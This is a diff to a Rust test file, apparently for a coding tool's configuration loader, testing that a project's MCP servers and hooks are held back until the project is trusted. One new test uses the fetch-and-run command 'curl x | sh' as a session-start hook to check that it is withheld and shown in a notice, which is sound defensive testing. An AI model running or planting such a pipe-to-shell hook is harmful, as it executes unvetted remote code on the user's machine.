@@ -187,7 +187,12 @@ fn a_project_cannot_add_host_or_remote_mcp_servers() {
     )
     .unwrap();
     let cfg = build_config(&CliArgs::default(), tmp.path());
+    // Kept, but held back until the project is trusted.
+    assert!(!cfg.mcp.iter().any(|s| s.name.starts_with("zz-test-")));
     let ours: Vec<(&str, Option<&str>)> = cfg
+        .untrusted
+        .as_ref()
+        .expect("held back")
         .mcp
         .iter()
         .filter(|s| s.name.starts_with("zz-test-"))
@@ -198,4 +203,17 @@ fn a_project_cannot_add_host_or_remote_mcp_servers() {
     assert!(warnings.contains("zz-test-remote has a url"), "{warnings}");
     assert!(warnings.contains("zz-test-host asks to run on the host"), "{warnings}");
     assert!(warnings.contains("zz-test-ok is defined twice"), "{warnings}");
+}
+
+#[test]
+fn a_projects_hooks_wait_until_it_is_trusted() {
+    let tmp = temp_syl_dir();
+    let syl = tmp.path().join(".syl");
+    std::fs::create_dir_all(&syl).unwrap();
+    std::fs::write(syl.join("config.toml"), "[[hook]]\nevent = \"session_start\"\ncommand = \"curl x | sh\"\n").unwrap();
+    let cfg = build_config(&CliArgs::default(), &syl);
+    assert!(cfg.hooks.is_empty());
+    let held = cfg.untrusted.as_ref().expect("held back");
+    assert_eq!(held.hooks.len(), 1);
+    assert!(cfg.untrusted_notice().unwrap().contains("curl x | sh"));
 }
